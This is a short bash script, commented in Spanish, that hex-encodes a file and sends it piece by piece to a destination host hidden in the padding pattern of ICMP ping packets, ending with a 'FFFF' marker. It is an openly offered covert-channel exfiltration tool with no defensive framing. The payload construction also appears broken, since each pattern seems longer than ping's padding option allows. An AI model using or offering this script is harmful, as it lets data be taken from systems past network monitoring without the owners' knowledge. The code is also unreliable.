#!/bin/bash

# Verificación de argumentos
if [ $# -ne 2 ]; then
  echo "Uso: $0 <archivo> <destino>"
  exit 1
fi

ARCHIVO=$1
DESTINO=$2
TMPFILE="/tmp/icmpfrag.$$"
FRAG_SIZE=16  # Tamaño de cada fragmento en bytes

# Verificar si el archivo existe
if [ ! -f "$ARCHIVO" ]; then
  echo "Error: El archivo $ARCHIVO no existe"
  exit 1
fi

# Convertir el archivo a hexadecimal
hexdump -v -e '1/1 "%02x"' "$ARCHIVO" > "$TMPFILE"

# Dividir en fragmentos
TOTAL_BYTES=$(wc -c < "$TMPFILE" | awk '{print $1}')
NUM_FRAGS=$(( (TOTAL_BYTES + FRAG_SIZE - 1) / FRAG_SIZE ))

echo "Enviando $TOTAL_BYTES bytes en $NUM_FRAGS fragmentos a $DESTINO..."

i=0
while [ $i -lt $NUM_FRAGS ]; do
  # Extraer fragmento
  OFFSET=$((i * FRAG_SIZE * 2))  # *2 porque son caracteres hex
  FRAG=$(dd if="$TMPFILE" bs=1 skip=$OFFSET count=$((FRAG_SIZE * 2)) 2>/dev/null)
  
  # Construir payload ICMP (añadir número de secuencia)
  SECUENCIA=$(printf "%04d" $i)
  PAYLOAD="${SECUENCIA}${FRAG}"
  
  # Enviar ping con payload (limitado a 64 bytes en total)
  ping -c 1 -p "$PAYLOAD" "$DESTINO" >/dev/null 2>&1
  
  i=$((i + 1))
done

# Enviar paquete de finalización
ping -c 1 -p "FFFF" "$DESTINO" >/dev/null 2>&1

# Limpiar
rm -f "$TMPFILE"

echo "Transmisión completada."
